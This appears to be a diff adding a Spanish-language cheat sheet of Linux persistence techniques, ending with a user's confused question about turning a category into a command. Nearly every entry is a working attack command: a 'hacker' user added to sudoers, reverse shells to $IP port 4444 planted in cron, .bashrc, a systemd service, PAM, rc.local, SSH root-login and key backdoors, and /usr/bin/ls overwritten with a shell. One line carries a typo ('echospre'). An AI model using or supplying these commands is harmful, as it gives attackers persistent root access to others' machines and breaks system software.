@@ -1,0 +1,40 @@
+▶ Crear Usuario (Añadir usuario al sistema):
+  useradd -m -s /bin/bash hacker
+  echo "hacker:password" | chpasswd
+
+▶ Agregar a Sudoers (Dar privilegios sudo):
+  echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
+
+▶ Crear Tarea Cron (Ejecutar backdoor periódicamente):
+  echo "* * * * * root bash -i >& /dev/tcp/$IP/4444 0>&1" > /etc/cron.d/backdoor
+
+▶ Backdoor SSH (Permitir acceso remoto):
+  echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
+  echo "<clave_pública_atacante>" >> /root/.ssh/authorized_keys
+  service ssh restart
+
+▶ Backdoor en .bashrc (Ejecutar al iniciar sesión):
+  echo "bash -i >& /dev/tcp/$IP/4444 0>&1 &" >> ~/.bashrc
+
+▶ Crear Servicio Systemd (Persistencia con servicio):
+  echo "[Unit]
+  Description=Mi Backdoor
+  [Service]
+  ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$IP/4444 0>&1'
+  Restart=always
+  [Install]
+  WantedBy=multi-user.target" > /etc/systemd/system/backdoor.service
+  systemctl enable backdoor.service
+  systemctl start backdoor.service
+
+▶ Backdoor en PAM (Ejecutar al autenticar):
+  echospre '#!/bin/bash\nbash -i >& /dev/tcp/$IP/4444 0>&1' > /usr/local/bin/backdoor.sh
+  chmod +x /usr/local/bin/backdoor.sh
+  echo "auth optional pam_exec.so /usr/local/bin/backdoor.sh" >> /etc/pam.d/common-auth
+
+▶ Persistencia con rc.local (Ejecutar al iniciar):
+  echo "/bin/bash -i >& /dev/tcp/$IP/4444 0>&1 &" >> /etc/rc.local
+
+▶ Backdoor en Binario Existente (Modificar binario común):
+  echo '#!/bin/bash\nbash -i >& /dev/tcp/$IP/4444 0>&1 &' > /usr/bin/ls
+  chmod +x /usr/bin/ls     pero  esta como categoria como puedo poner como comando no entiendo eso
